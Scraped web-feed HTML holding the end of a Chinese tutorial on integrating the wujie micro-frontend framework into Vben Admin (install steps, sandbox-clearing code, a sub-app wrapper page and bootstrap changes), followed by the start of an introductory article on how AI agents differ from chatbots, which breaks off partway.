                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><ol>
<li><a href="https://juejin.cn/post/7584719268043391010" target="_blank" title="https://juejin.cn/post/7584719268043391010"># Vben Admin管理系统集成qiankun微服务（一）</a></li>
<li><a href="https://juejin.cn/post/7593342203822669830" target="_blank" title="https://juejin.cn/post/7593342203822669830"># Vben Admin管理系统集成qiankun微服务（二）</a></li>
</ol>
<h2 data-id="heading-0">一、前言</h2>
<p>本篇是vben前端框架集成微服务的第3篇，前段时间写了vue-vben-admin集成qiankun的两篇文章，收到了大家不少建议，文章还遗留了一个问题就是多tab标签不支持状态保持，借助AI虽然也实现的相应方案，但是对vben的package包修改内容较多（后续同步主框架较为繁琐），并且修改代码健状性不好评估。抱歉暂停了进一步完善实现方案，目前先保持基本功能是ok。</p>
<p>近期也尝试<code>wujie微前端框架</code>发现能满足我当前的所有诉求，所以有了本篇的文章内容，<code>前两篇文章的功能和问题在本文中都已支持</code>，选择wujie原因是支持以下两个功能:</p>
<ul>
<li>天然支持保活模式alive=true，与vben中route中Keeplive参数绑定，能支持状态保持的配置。</li>
<li>wujie实现逻辑是iframe框架模式,对子应改造较小，如果不要支持主应用传参子应用可以不用改造或少量改造。</li>
</ul>
<p>下面分步实施集成功能：</p>
<h2 data-id="heading-1">二、主应用调整</h2>
<h3 data-id="heading-2">1.安装wujie和wujie-vue3</h3>
<pre><code class="hljs language-js" lang="js"># 安装wujie
pnpm i wujie
# 安装wujie-vue3
pnpm i wujie-vue3
</code></pre>
<h3 data-id="heading-3">2. 清除沙箱数据实现</h3>
<p>主应用<code>src</code>下添加wujie文件夹并添加index.ts文件，两个函数实现功能是清理沙箱缓存数据，保证在”退出登录重新打开“样式不会异常，refreshApp函数为后续单个页签关闭提供备用支持。
index.ts,文件内容如下：</p>
<pre><code class="hljs language-js" lang="js">interface <span class="hljs-title class_">HTMLIframeElementWithContentWindow</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HTMLIFrameElement</span> {
  <span class="hljs-attr">contentWindow</span>: <span class="hljs-title class_">Window</span>;
}

<span class="hljs-comment">// refreshApp 主应用可以通过下述方法，主动清除指定子应用的沙箱缓存</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">refreshApp</span> = (<span class="hljs-params">name = <span class="hljs-string">''</span></span>) =&gt; {
  <span class="hljs-keyword">if</span> (!name) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'refreshApp方法必须传入子应用的name属性'</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 这里的window应该是顶级窗口，也就是主应用的window</span>
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SUB_FRAME</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">document</span>.<span class="hljs-title function_">querySelector</span>(
    <span class="hljs-string">`iframe[name=<span class="hljs-subst">${name}</span>]`</span>,
  ) <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLIframeElementWithContentWindow</span>;

  <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">SUB_FRAME</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`未找到<span class="hljs-subst">${name}</span>子应用，跳过刷新`</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SUB_WINDOW</span> = <span class="hljs-variable constant_">SUB_FRAME</span>.<span class="hljs-property">contentWindow</span>;
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SUB_IDMAP</span> = <span class="hljs-variable constant_">SUB_WINDOW</span>.<span class="hljs-property">__WUJIE</span>?.<span class="hljs-property">inject</span>?.<span class="hljs-property">idToSandboxMap</span>; <span class="hljs-comment">// 沙箱Map对象</span>
  <span class="hljs-variable constant_">SUB_IDMAP</span>.<span class="hljs-title function_">clear</span>();
};

<span class="hljs-comment">// 主应用中清除所有已激活的子应用沙箱缓存</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">refreshAllApp</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 找到所有无界子应用的iframe</span>
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ALL_SUB_IFRAME</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">document</span>.<span class="hljs-title function_">querySelectorAll</span>(
    <span class="hljs-string">'iframe[data-wujie-flag]'</span>,
  );

  <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">ALL_SUB_IFRAME</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'未找到任何子应用，跳过刷新'</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 拿到这些iframe里面的contentWindow</span>
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ALL_SUB_WINDOW</span> = [...<span class="hljs-variable constant_">ALL_SUB_IFRAME</span>].<span class="hljs-title function_">map</span>(
    <span class="hljs-function">(<span class="hljs-params">v</span>) =&gt;</span> (v <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLIframeElementWithContentWindow</span>).<span class="hljs-property">contentWindow</span>,
  );

  <span class="hljs-comment">// 依次执行清除</span>
  <span class="hljs-variable constant_">ALL_SUB_WINDOW</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">v</span>) =&gt;</span> v.<span class="hljs-property">__WUJIE</span>?.<span class="hljs-property">inject</span>?.<span class="hljs-property">idToSandboxMap</span>?.<span class="hljs-title function_">clear</span>());
};

<span class="hljs-keyword">export</span> { refreshAllApp, refreshApp };

</code></pre>
<p>主应用/src/layouts/basic.vue 程序主界面，在头部引入上述文件并在相应位置调用清除沙箱方法</p>
<pre><code class="hljs language-js" lang="js"># 引用
<span class="hljs-keyword">import</span> { refreshAllApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'#/wujie/index'</span>;

# 退出时清理
<span class="hljs-comment">// logout</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleLogout</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">await</span> authStore.<span class="hljs-title function_">logout</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-title function_">refreshAllApp</span>();
}
</code></pre>
<h3 data-id="heading-4">3. 添加微服务通用页面wujie.vue</h3>
<p>在主应用 /apps/web-caipu/src/views/_core下添加wujie.vue页面，页面内容如：</p>
<pre><code class="hljs language-js" lang="js">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> { useRoute } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>;

<span class="hljs-keyword">import</span> { preferences } <span class="hljs-keyword">from</span> <span class="hljs-string">'@vben/preferences'</span>;
<span class="hljs-keyword">import</span> { useAccessStore, useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@vben/stores'</span>;

<span class="hljs-keyword">import</span> <span class="hljs-title class_">WujieVue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'wujie-vue3'</span>;

<span class="hljs-keyword">const</span> useStore = <span class="hljs-title function_">useUserStore</span>();
<span class="hljs-keyword">const</span> accessStore = <span class="hljs-title function_">useAccessStore</span>();
<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>();

<span class="hljs-comment">// props通信</span>
<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">ref</span>({
  <span class="hljs-attr">userinfo</span>: useStore.<span class="hljs-property">userInfo</span>,
  <span class="hljs-attr">token</span>: accessStore.<span class="hljs-property">accessToken</span>,
  preferences,
});
<span class="hljs-comment">// 加时缀是强制刷新</span>
<span class="hljs-keyword">const</span> appUrl = <span class="hljs-title function_">ref</span>(<span class="hljs-string">`http://localhost:5667/app<span class="hljs-subst">${route.path}</span>?t=<span class="hljs-subst">${<span class="hljs-built_in">Date</span>.now()}</span>`</span>);
<span class="hljs-keyword">const</span> keepLive = route.<span class="hljs-property">meta</span>?.<span class="hljs-property">keepAlive</span>;
&lt;/script&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"sub-app-container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">WujieVue</span>
      <span class="hljs-attr">width</span>=<span class="hljs-string">"100%"</span>
      <span class="hljs-attr">height</span>=<span class="hljs-string">"100%"</span>
      <span class="hljs-attr">:name</span>=<span class="hljs-string">"appUrl"</span>
      <span class="hljs-attr">:url</span>=<span class="hljs-string">"appUrl"</span>
      <span class="hljs-attr">:alive</span>=<span class="hljs-string">"keepLive"</span>
      <span class="hljs-attr">:props</span>=<span class="hljs-string">"props"</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.sub-app-container</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">background</span>: white;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.sub-app-container</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">overflow</span>: hidden;
  <span class="hljs-attribute">background</span>: white;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span>

</code></pre>
<p>聪明的你，一定知道实现的逻辑。其中子应用的地址测试写localhost:5667,后面会集成配置文件中，至此主应用改造完成。</p>
<h2 data-id="heading-5">三、子应用改造</h2>
<p>子应用基本不用改，只要改/Users/wgh/code/caipu-vben-admin/apps-micro/web-antd/src/bootstrap.ts文件即可</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03697f6285fc45818c1289b3a6a7045f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29fY2FpcHU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771548044&amp;x-signature=ysEtLWVw5xm%2BxQ0PembDHufccFY%3D" alt="image.png" loading="lazy"/>
在49行添加如下代码，代码不用解释，之前一样的实现逻辑。</p>
<pre><code class="hljs language-js" lang="js">
 <span class="hljs-comment">// 初使化存储之后赋值，避免路由判断跳转到登录页</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">__POWERED_BY_WUJIE__</span>) {
    <span class="hljs-comment">// props 接收</span>
    <span class="hljs-keyword">const</span> props = <span class="hljs-variable language_">window</span>.<span class="hljs-property">$wujie</span>?.<span class="hljs-property">props</span>; <span class="hljs-comment">// {data: xxx, methods: xxx}</span>
    <span class="hljs-keyword">const</span> useStore = <span class="hljs-title function_">useUserStore</span>();
    <span class="hljs-keyword">const</span> accessStore = <span class="hljs-title function_">useAccessStore</span>();
    useStore.<span class="hljs-title function_">setUserInfo</span>(props.<span class="hljs-property">userInfo</span>);
    accessStore.<span class="hljs-title function_">setAccessToken</span>(props.<span class="hljs-property">token</span>);
    <span class="hljs-title function_">updatePreferences</span>(props.<span class="hljs-property">preferences</span>);
    <span class="hljs-comment">// window.$wujie?.bus.$on('wujie-theme-update', (theme: any) =&gt; {</span>
    <span class="hljs-comment">//   alert('wujie-theme-update');</span>
    <span class="hljs-comment">//   updatePreferences(theme);</span>
    <span class="hljs-comment">// });</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'wujie-theme-update'</span>, <span class="hljs-function">(<span class="hljs-params">theme: any</span>) =&gt;</span> {
      <span class="hljs-title function_">updatePreferences</span>(theme.<span class="hljs-property">detail</span>);
    });
  }

</code></pre>
<h2 data-id="heading-6">四。新增路由配置</h2>
<p>在主应用路由中配置子应用一个测试路由 /app/basic/test，</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f23aa3d893c04e9480f97392fa8f4dd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29fY2FpcHU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771548044&amp;x-signature=vk13dc1JQ7KDY%2FeXCc0NXgBS8Tg%3D" alt="image.png" loading="lazy"/></p>
<p>为测试在子应用状态保持，我在页面中添加一个测试文本框 ，测试内容不会随着切tab页签而重新加载，浏览器的前进后退也不会出错。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5060195186484313b79fe03fdf1d0d72~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29fY2FpcHU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771548044&amp;x-signature=wCjfOlQNOGSf%2BHFp9Y28EKT6AHQ%3D" alt="image.png" loading="lazy"/></p>
<p>上述功能已集成在前端程序里，如果我的文章对你有帮助，感谢给我点个🌟</p>
<ul>
<li>前端地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fgo-caipu-team%2Fcaipu-vben-admin" target="_blank" title="https://gitee.com/go-caipu-team/caipu-vben-admin" ref="nofollow noopener noreferrer">caipu-vue-admin</a></li>
<li>后端地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fgo-caipu-team%2Fgo-caipu" target="_blank" title="https://gitee.com/go-caipu-team/go-caipu" ref="nofollow noopener noreferrer">go-caipu</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从源码拆解AI Agent与普通聊天机器人的本质区别]]></title>    <link>https://juejin.cn/post/7605539194690027520</link>    <guid>https://juejin.cn/post/7605539194690027520</guid>    <pubDate>2026-02-12T10:59:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605539194690027520" data-draft-id="7605537925149704244" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从源码拆解AI Agent与普通聊天机器人的本质区别"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-12T10:59:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="架构之旅"/> <meta itemprop="url" content="https://juejin.cn/user/4197285845537738"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从源码拆解AI Agent与普通聊天机器人的本质区别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4197285845537738/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    架构之旅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T10:59:02.000Z" title="Thu Feb 12 2026 10:59:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>AI Agent实战系列·第1篇</strong><br/>
从源码拆解Agent与普通聊天机器人的本质区别</p>
</blockquote>
<h2 data-id="heading-0">写在前面</h2>
<p><strong>本文你将收获：</strong></p>
<ul>
<li>✅ 5分钟理解AI Agent到底是什么</li>
<li>✅ 看懂Agent与ChatGPT的3个核心区别</li>
<li>✅ 用100行代码实现一个能干活的AI</li>
<li>✅ 运行你的第一个Agent程序</li>
</ul>
<hr/>
<h2 data-id="heading-1">一、一个真实的场景</h2>
<p>想象一下，你现在需要完成这样一个任务：</p>
<blockquote>
<p>"帮我分析一下昨天的销售数据，计算总营收，找出销量最高的3个产品，然后给老板发个邮件汇报。"</p>
</blockquote>
<p><strong>用ChatGPT怎么做？</strong></p>
<p>你可能需要这样操作：</p>
<ol>
<li>手动打开Excel，导出数据</li>
<li>复制数据到ChatGPT，让它分析</li>
<li>ChatGPT给你结果</li>
<li>你再手动整理格式</li>
<li>打开邮箱，粘贴内容</li>
<li>检查格式，发送邮件</li>
</ol>
<p><strong>整个过程需要人工参与6个步骤。</strong></p>
<hr/>
<p><strong>用AI Agent怎么做？</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">你：帮我分析昨天的销售数据并发邮件给老板

Agent：收到！让我来处理
  → 正在读取数据库...
  → 正在分析数据...
  → 计算完成：总营收 ¥<span class="hljs-number">125</span>,<span class="hljs-number">340</span>
  → 销量Top3：产品A、产品B、产品C
  → 正在生成邮件...
  → 邮件已发送！
</code></pre>
<p><strong>整个过程全自动，你只需要一句话。</strong></p>
<p>这就是AI Agent的魔力 —— <strong>它不仅会"想"，还会"做"。</strong></p>
<hr/>
<h2 data-id="heading-2">二、什么是AI Agent？</h2>
<h3 data-id="heading-3">2.1 一句话定义</h3>
<blockquote>
<p><strong>AI Agent = 大语言模型的"大脑" + 工具的"手脚" + 自主决策的能力</strong></p>
</blockquote>
<p>让我们拆解一下：</p>

























<table><thead><tr><th>组成部分</th><th>作用</th><th>类比</th></tr></thead><tbody><tr><td>🧠 大语言模型</td><td>思考、规划、决策</td><td>人的大脑</td></tr><tr><td>🛠️ 工具系统</td><td>执行具体操作</td><td>人的手脚</td></tr><tr><td>🔄 反馈循环</td><td>根据结果调整策略</td><td>人的学习能力</td></tr></tbody></table>
<h3 data-id="heading-4">2.2 用代码理解</h3>
<p>一个最简单的Agent长这样：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">simple_agent</span>(<span class="hljs-params">task</span>):
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> task_completed:
        <span class="hljs-comment"># 1. 思考：下一步做什么？</span>
        thought = llm.think(task)
        
        <span class="hljs-comment"># 2. 行动：使用工具执行</span>
        result = use_tool(thought.action)
        
        <span class="hljs-comment"># 3. 反馈：根据结果继续思考</span>
        task = update_task(result)
    
    <span class="hljs-keyword">return</span> final_result
</code></pre>
<p><strong>核心是这个循环：想 → 做 → 看结果 → 再想 → 再做...</strong></p>
<p>这和人类解决问题的方式一模一样！</p>
<hr/>
<h2 data-id="heading-5">三、Agent vs ChatGPT：三个本质区别</h2>
<p>很多人会困惑：ChatGPT不就是AI吗？Agent和它有什么不同？</p>
<h3 data-id="heading-6">区别1️⃣：被动 vs 主动</h3>
<p><strong>ChatGPT（被动响应）：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">你：帮我查一下明天的天气
ChatGPT：抱歉，我无法访问实时信息...
</code></pre>
<p><strong>Agent（主动执行）：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">你：帮我查一下明天的天气
Agent：
  → 调用天气API...
  → 明天北京：晴，<span class="hljs-number">15</span>-<span class="hljs-number">25</span>℃
  → 建议穿薄外套
</code></pre>
<h3 data-id="heading-7">区别2️⃣：单轮 vs 多轮推理</h3>
<p><strong>ChatGPT：</strong> 一问一答，每次对话相对独立</p>
